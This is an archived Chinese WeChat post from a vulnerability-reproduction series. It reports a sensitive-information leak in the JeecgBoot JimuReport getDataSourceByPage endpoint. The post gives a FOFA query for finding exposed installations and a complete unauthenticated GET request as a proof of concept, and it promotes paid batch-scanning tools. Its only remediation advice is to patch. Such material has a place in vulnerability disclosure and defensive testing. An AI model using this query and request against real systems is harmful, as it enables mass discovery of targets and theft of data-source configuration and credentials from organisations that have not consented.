---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  JeecgBoot积木报表getDataSourceByPage接口存在敏感信息泄露漏洞 附POC  
2026-1-8更新  南风漏洞复现文库   2026-01-08 15:45  
  
   
  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. JeecgBoot积木报表简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
本人只有 南风漏洞复现文库 和 南风网络安全  
 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。  
  
JeecgBoot积木报表  
## 2.漏洞描述  
  
JeecgBoot积木报表getDataSourceByPage接口存在敏感信息泄露漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
JeecgBoot积木报表  
![JeecgBoot积木报表getDataSourceByPage接口存在敏感信息泄露漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3bOibx82hnYgtWRLSLwX6Np5aZ2MIhfLjQsMODib1l4lGt6WKeFRCGfsH12xCycqtUNA7DGmhqB5ItQ/640?wx_fmt=png&from=appmsg "null")  
  
JeecgBoot积木报表getDataSourceByPage接口存在敏感信息泄露漏洞  
## 4.fofa查询语句  
  
title=="JeecgBoot 企业级低代码平台" || body="window._CONFIG['imgDomainURL'] = 'http://localhost:8080/jeecg-boot/" || title="Jeecg-Boot 企业级快速开发平台" || title="Jeecg 快速开发平台" || body="'http://fileview.jeecg.com/onlinePreview'" || title=="JeecgBoot 企业级低代码平台" || title=="Jeecg-Boot 企业级快速开发平台" || title=="JeecgBoot 企业级快速开发平台" || title=="JeecgBoot 企业级快速开发平台" || title="Jeecg 快速开发平台" || title="Jeecg-Boot 快速开发平台" || body="积木报表" || body="jmreport"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/jmreport/getDataSourceByPage  
  
漏洞数据包：  
```
GET /jmreport/getDataSourceByPage HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bOibx82hnYgtWRLSLwX6Np5tJsPjtqZSibNcB30kNuowOtEgqhWxM0miaB5cW6OT4ZGG3tT3yCWlibHQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bOibx82hnYgtWRLSLwX6Np56lafpUdY4tmdEmiaSgEeEictHxq3IyAuU4RnOFwysdncPPUGIo56lRxw/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bOibx82hnYgtWRLSLwX6Np5sM1JHAiahDBeP47jJxSyFMUrZRkV0hXEUrEVPtTUM7dsZvoURgfaia6Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bOibx82hnYgtWRLSLwX6Np5oxcfzd0H1Cvay1o6OiaJ9SqoIYSmTGHfrqhGnYh05WYE55G8HlPF9rQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bOibx82hnYgtWRLSLwX6Np516o863y7Vaehm8WZYHrIPZtlu31Y9GIbGYBHnQgG0dP4h5YDym2UNA/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bOibx82hnYgtWRLSLwX6Np50qbCZqicSWfCHUHQqC0YNHPr5HDaWjWy8icmmIMJoazMldVbN9gUO3FA/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
[JNPF快速开发平台存在任意文件读取漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247489841&idx=1&sn=9e0af0c5b93deafccc5031d37f87ffc3&scene=21#wechat_redirect)  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
